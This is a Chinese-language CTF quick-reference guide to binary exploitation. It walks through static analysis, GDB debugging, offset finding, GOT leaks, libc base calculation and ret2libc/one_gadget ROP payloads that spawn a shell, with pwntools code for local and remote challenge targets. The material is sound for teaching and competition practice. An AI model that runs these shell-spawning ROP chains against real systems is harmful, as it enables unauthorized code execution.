# Binary Exploitation 快速流程指南

競賽向極速 pwn 工作流程，適用於 5 小時 CTF。

## 靜態分析流程 (Step 0)

**首次接觸二進制時，先進行靜態分析**:

### 0.1: 查找字串

```bash
# 基本字串搜尋
strings ./vuln

# 過濾可疑關鍵字
strings ./vuln | grep -iE "flag|password|key|admin|secret"

# 查找可列印 ASCII 字串 (至少 4 個字符)
strings -n 4 ./vuln

# 查找寬字符字串 (UTF-16)
strings -e l ./vuln
```

**關注重點**:
- Flag 格式 (如 `flag{...}`, `CTF{...}`)
- 硬編碼密碼或密鑰
- 函數名稱 (自定義函數可能是漏洞點)
- 檔案路徑 (可能透露部署環境)
- 調試訊息 (開發者留下的線索)

### 0.2: 反編譯分析

**使用 Ghidra**:
```bash
# 1. 啟動 Ghidra
ghidraRun

# 2. Import File → 選擇二進制
# 3. 雙擊項目 → 自動分析 (選 "Yes")
# 4. 查看 Symbol Tree → Functions → main
```

**或使用本工具批次反編譯**:
```bash
python 01_bin_exploit/decompile.py ./vuln
# 輸出所有函數的反編譯 C 代碼
```

**分析重點**:
- 程式邏輯流程 (控制流)
- 輸入點與輸出點
- 危險函數 (`gets`, `strcpy`, `scanf`, `read`)
- 比較操作 (password check, 條件判斷)
- 算法邏輯 (rev 題型重點)

### 0.3: 動態調試驗證

```bash
# 在 pwntools 模板中啟動 GDB
python solve.py GDB
```

**或直接用 GDB**:
```bash
gdb ./vuln

# 設置斷點在可疑函數
b main
b vulnerable_function

# 執行
run

# 查看反組譯
disasm main

# 單步執行
si   # step instruction
ni   # next instruction

# 查看暫存器
info registers
# 或
i r

# 查看記憶體
x/20wx $rsp    # 查看 stack
x/s 0x401000   # 查看字串
```

**驗證目標**:
- 確認 strings 找到的線索
- 觀察實際執行流程是否與反編譯一致
- 測試輸入邊界條件 (buffer overflow)
- 觀察敏感數據在記憶體中的位置

---

## 本地測試流程 (動態利用)

### Step 1: 檢查保護機制

```bash
checksec ./vuln
```

**關注重點**:
- **NX (No-eXecute)**: Stack 不可執行 → 需要 ROP
- **PIE (Position Independent)**: 地址隨機化 → 需要洩漏地址
- **RELRO (Relocation Read-Only)**:
  - Partial: GOT 可寫 → GOT overwrite
  - Full: GOT 唯讀 → ret2libc
- **Canary**: Stack 保護 → 需繞過或洩漏

### Step 2: 本地崩潰 + 找 offset

```python
# 使用模板
cp 00_templates/pwn_basic.py solve.py

# 修改 exe 路徑
exe = "./vuln"

# 生成 cyclic 模式並觀察崩潰
io = start()
io.sendline(cyclic(500))
io.wait()
```

**找 offset**:
```python
# 方法 1: 從 core dump 讀取
core = io.corefile
offset = cyclic_find(core.rsp)  # x64
offset = cyclic_find(core.eip)  # x86

# 方法 2: GDB 手動查看
python solve.py GDB
# 在 GDB 中: info registers
# 然後: cyclic_find(0x61616163)
```

### Step 3: 資訊洩漏 (Leak)

**常見洩漏目標**:
- **GOT entries**: 已解析的 libc 函數地址
- **Stack addresses**: 用於計算 stack base
- **Binary addresses**: 用於計算 PIE base

**通過 puts 洩漏 libc**:
```python
# ROP chain 洩漏 puts@got
payload = flat({
    offset: [
        pop_rdi,               # gadget: pop rdi; ret
        elf.got["puts"],       # 參數: puts@got 地址
        elf.plt["puts"],       # 呼叫 puts
        elf.symbols["main"]    # 返回 main (重新利用)
    ]
})

io.sendline(payload)
io.recvuntil(b"expected_output")
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
info(f"Leaked puts@libc: {hex(leak)}")
```

### Step 4: 計算 libc base

```python
# 已知 leak 是 puts 在 libc 中的實際地址
libc_base = leak - libc.symbols["puts"]
info(f"libc base: {hex(libc_base)}")

# 計算 system 和 /bin/sh
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
```

**如何找到正確的 libc**:
```bash
# 方法 1: 使用 libc database
# https://libc.blukat.me/
# https://libc.rip/

# 方法 2: 本地 libc
ldd ./vuln  # 查看使用的 libc
```

### Step 5: 構造 ROP chain

**經典 ret2libc** (x64):
```python
payload = flat({
    offset: [
        ret,            # stack alignment (system 需要)
        pop_rdi,        # pop rdi; ret
        binsh_addr,     # "/bin/sh" 地址
        system_addr     # system 地址
    ]
})
```

**注意 stack alignment**:
```python
# x64 system 呼叫前需要 RSP 16-byte 對齊
# 如果出現 SIGSEGV，在 pop_rdi 前加一個 ret gadget
```

### Step 6: 獲取 shell

```python
io.sendline(payload)
io.interactive()
# 應該進入 shell
```

## 遠端利用流程

### Step 1: 確認本地可用

```bash
python solve.py
# 確保本地能成功拿到 shell
```

### Step 2: 切換到遠端模式

```bash
python solve.py REMOTE 192.168.1.100 1337
```

**注意事項**:
- 遠端 libc 版本可能不同
- 需要透過洩漏多個函數來識別 libc

### Step 3: 識別遠端 libc

**洩漏多個函數地址**:
```python
# 洩漏 puts 和 printf
payload1 = flat({offset: [pop_rdi, elf.got["puts"], elf.plt["puts"], main]})
io.sendline(payload1)
puts_leak = u64(io.recvline().strip().ljust(8, b'\x00'))

payload2 = flat({offset: [pop_rdi, elf.got["printf"], elf.plt["puts"], main]})
io.sendline(payload2)
printf_leak = u64(io.recvline().strip().ljust(8, b'\x00'))

# 使用 libc database 查找
# puts 末三位: xxx
# printf 末三位: yyy
```

### Step 4: 使用正確 libc 重新測試

```python
# 下載正確的 libc
# libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")

# 重新計算 offset
libc_base = puts_leak - libc.symbols["puts"]
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
```

## GDB 調試流程

### 啟動 GDB 模式

```bash
python solve.py GDB
```

### 常用 pwndbg 命令

```gdb
# 查看上下文
context

# 查看暫存器
info registers
# 或簡寫
i r

# 查看 stack
telescope $rsp
# 或
stack 20

# 查看記憶體映射
vmmap

# 查看 GOT/PLT
got
plt

# 計算 PIE base
piebase

# 查看函數反組譯
disasm main

# 設置斷點
b *main+123
b *0x401234

# 繼續執行
continue  # 或 c
si       # step instruction
ni       # next instruction

# 查找 gadgets (pwndbg 內建)
rop --grep "pop rdi"
```

### 自定義 GDB 腳本

在 `solve.py` 中:
```python
gdbscript = """
continue
# 斷在 vulnerable function 返回前
b *vuln+123
continue
# 查看 stack
telescope $rsp 20
""".format(**locals())

io = gdb.debug([exe], gdbscript=gdbscript)
```

## one_gadget 快速 shell

**當 constraints 滿足時，可直接跳到 one_gadget**:

```bash
one_gadget libc.so.6
```

輸出:
```
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

**使用**:
```python
one_gadget = libc_base + 0x4f322
payload = flat({offset: one_gadget})
```

## 常見問題排查

### 本地可用但遠端失敗

**原因**: libc 版本不同
**解決**: 洩漏多個函數，使用 libc database 識別

### SIGSEGV 在 system 呼叫時

**原因**: stack 未對齊 (x64)
**解決**: 在 pop_rdi 前加 `ret` gadget

### 找不到 /bin/sh 字串

**方法 1**: 在 libc 中搜尋
```python
binsh = next(libc.search(b"/bin/sh"))
```

**方法 2**: 寫入 .bss
```python
# 使用 read 或 gets 寫入 /bin/sh 到 .bss
bss = elf.bss()
payload1 = flat({offset: [pop_rdi, 0, pop_rsi_r15, bss, 0, pop_rdx, 8, read_plt, main]})
io.sendline(payload1)
io.send(b"/bin/sh\x00")
```

### 找不到合適的 gadgets

**使用工具**:
```bash
ROPgadget --binary vuln | grep "pop rdi"
ropper --file vuln --search "pop rdi"

# 或在 libc 中找
ROPgadget --binary libc.so.6 | grep "pop rdi"
```

**利用 pwntools**:
```python
rop = ROP(elf)
rop.call("puts", [elf.got["puts"]])
rop.call("main")
payload = flat({offset: rop.chain()})
```

## 檢查清單

**利用前**:
- [ ] checksec 確認保護
- [ ] 本地測試 offset 正確
- [ ] 洩漏地址正確解析
- [ ] libc base 計算正確
- [ ] stack alignment 檢查 (x64)

**遠端前**:
- [ ] 本地完整流程通過
- [ ] 洩漏多個函數識別 libc
- [ ] 測試 one_gadget constraints
- [ ] 考慮網路延遲 (增加 timeout)

## 參考資料

- **quickref_gadgets.md** - Gadget 查找命令
- **quickref_gdb.md** - GDB 調試命令
- **ret2libc_checklist.md** - ret2libc 詳細步驟
- **00_templates/pwn_rop.py** - 完整 ROP 模板
